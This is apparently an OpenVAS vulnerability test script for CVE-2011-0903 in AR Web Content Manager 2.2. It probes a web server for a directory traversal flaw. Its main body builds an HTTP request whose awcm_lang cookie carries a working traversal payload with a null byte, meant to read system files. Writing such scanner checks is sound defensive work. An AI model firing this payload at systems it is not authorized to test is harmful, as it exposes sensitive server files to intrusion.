##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_awcm_mult_dir_trav_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# AR Web Content Manager Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902338");
  script_version("$Revision: 13659 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_cve_id("CVE-2011-0903");
  script_bugtraq_id(46017);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("AR Web Content Manager Multiple Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64980");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16049/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"The flaw exists due to an error in 'index.php' and 'header.php'
  scripts, which allows to read arbitrary files via a .. (dot dot) in the
  'awcm_theme' or 'awcm_lang' cookies.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running AR Web Content Manager and is prone
  multiple Directory Traversal vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  potentially sensitive information and execute arbitrary local scripts in the
  context of the web server process.");
  script_tag(name:"affected", value:"AR Web Content Manager (AWCM) version 2.2");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

awcmPort = get_http_port(default:80);
if(!can_host_php(port:awcmPort)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:awcmPort);

files = traversal_files();

foreach dir(make_list_unique("/awcm", "/AWCM", cgi_dirs(port:awcmPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:awcmPort);

  if(">AWCM" >< rcvRes)
  {

    foreach pattern(keys(files)) {

      file = files[pattern];
      exp = "../../../../../../../../../../" + file + "%00";

      sndReq2 = string("GET ", string(dir + "/index.php"), " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "User-Agent: ", useragent, "\r\n",
                     "Cookie: awcm_lang=", exp, "\r\n\r\n");
      rcvRes2 = http_keepalive_send_recv(port:awcmPort, data:sndReq2);

      if(egrep(string: rcvRes2, pattern: pattern))
      {
        security_message(port:awcmPort);
        exit(0);
      }
    }
  }
}

exit(99);